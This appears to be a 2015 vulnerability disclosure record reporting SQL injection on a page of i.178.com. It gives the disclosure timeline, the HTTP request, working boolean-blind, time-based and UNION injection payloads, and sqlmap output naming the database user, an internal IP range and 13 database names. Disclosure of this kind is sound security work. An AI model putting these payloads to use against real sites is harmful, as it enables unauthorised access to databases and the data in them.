wybug_detail:
漏洞详情 披露状态：   									2015-06-17：	细节已通知厂商并且等待厂商处理中									2015-06-19：	厂商已经确认，细节仅向厂商公开									2015-06-29：	细节向核心白帽子及相关领域专家公开									2015-07-09：	细节向普通白帽子公开									2015-07-19：	细节向实习白帽子公开									2015-08-03：	细节向公众公开  简要描述： 233 详细说明：  
GET /~album.albumclass.list/pid/10080/top/c/c/*/1 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: i.178.comCookie: **Host: i.178.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept: */*
   漏洞证明：  
---Parameter: #1* (URI)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: http://i.178.com:80/~album.albumclass.list/pid/10080/top/c/c/-5043' OR 6437=6437 AND 'xSTf'='xSTf/1    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://i.178.com:80/~album.albumclass.list/pid/10080/top/c/c/' AND(SELECT * FROM (SELECT(SLEEP(5)))Vgxy) AND 'XJOz'='XJOz/1    Type: UNION query    Title: MySQL UNION query (40) - 12 columns    Payload: http://i.178.com:80/~album.albumclass.list/pid/10080/top/c/c/' UNION ALL SELECT CONCAT(0x7170717a71,0x586a6b684e794c754474,0x716b767071),40,40,40,40,40,40,40,40,40,40,40#/1---[14:18:37] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[14:18:37] [INFO] fetching current usercurrent user:    'new_sns_user@192.168.20.%'[14:18:40] [INFO] testing if current user is DBA[14:18:40] [INFO] fetching current user[14:18:42] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'current user is DBA:    False[14:18:42] [INFO] fetching database namesavailable databases [13]:[*] game[*] information_schema[*] sns2[*] sns_admin[*] sns_album[*] sns_api[*] sns_bet[*] sns_blog[*] sns_cite[*] sns_get_armory[*] sns_group[*] sns_gsrank[*] test
